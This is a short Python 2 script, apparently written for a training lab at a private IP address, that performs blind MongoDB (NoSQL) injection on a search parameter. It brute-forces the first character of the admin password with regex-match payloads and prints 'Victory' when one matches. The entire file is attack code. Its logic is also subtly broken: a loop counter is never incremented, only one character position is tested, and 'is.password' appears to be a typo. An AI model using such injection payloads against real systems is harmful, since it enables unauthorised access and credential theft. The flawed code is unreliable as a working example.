from string import ascii_lowercase
from itertools import product
import httplib, re, urllib, urllib2

if __name__ == '__main__':
    n = 0
    conn = httplib.HTTPConnection('192.168.159.131')
    charset = range(ord('a'), ord('z')+1)
    while n < 6:
        for i in charset:
            char = str(chr(i))
            conn.request('GET','/mongodb/example2/?search=admin%27%20%26%26%20is.password.match(/^'+char+'.*$/)//+%00')
            res = conn.getresponse()
            print char
            if re.search(r'admin', res.read()):
                print 'Victory'
                n = n+100
            print i
        n+1

